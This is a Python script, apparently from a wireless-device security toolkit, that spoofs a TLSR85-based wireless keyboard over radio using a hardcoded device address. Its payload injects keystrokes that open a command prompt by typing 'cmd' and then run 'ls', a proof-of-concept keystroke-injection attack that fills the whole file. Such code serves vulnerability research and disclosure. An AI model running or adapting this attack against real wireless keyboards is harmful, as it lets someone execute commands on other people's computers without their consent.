#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Dummy spoofer for TLSR85 based devices
# Address of keyboard is hardcoded

import time

from binascii import unhexlify
from lib import common
from devices.TLSR85.tlsr85 import Tlsr85
from devices.TLSR85.tlsr85_keyboard import *


common.init_args('./tlsr85-spoofing.py')
common.parse_and_init()


def spoof(attack, address, preamble, channels, rate):
    channel_index = 0
    common.radio.set_channel(channels[channel_index]) # Set channel here to prevent USBError (somehow)
    common.radio.enter_promiscuous_mode_generic(address, rate=rate)
    for payload in attack:
        if callable(payload):
            payload() # in case we want a delay
        else:
            for i in range(len(channels)):
                common.radio.set_channel(channels[i])
                for _ in range(20):
                    common.radio.transmit_payload_generic(payload=preamble+payload, address=address)
                    time.sleep(0.0001)




trust_keyboard = Tlsr85Keyboard("4a:b4:cb", "80", "aa:aa:b5", 22, 0x11021, 0x24bf, 2)
# poss_keyboard = Tlsr85Keyboard("d5:54:cb", "80", "aa:aa:cc", 22, 0x11021, 0xcb01, 2)


attack = [
    trust_keyboard.build_packet(modifiers=[Tlsr85KeyboardModifiers.MODIFIER_GUI_LEFT]),
    lambda: time.sleep(0.5),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_C]),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_M]),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_D]),
    lambda: time.sleep(0.5),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_KEYPAD_ENTER]),
    lambda: time.sleep(1),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_L]),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_S]),
    trust_keyboard.build_packet([Tlsr85KeyboardScancode.KEY_KEYPAD_ENTER])
    ]



address = unhexlify(trust_keyboard.base_address.replace(':', ''))
preamble = unhexlify(trust_keyboard.preamble.replace(':', ''))


spoof(attack, address, preamble, trust_keyboard.CHANNELS, trust_keyboard.RATE)
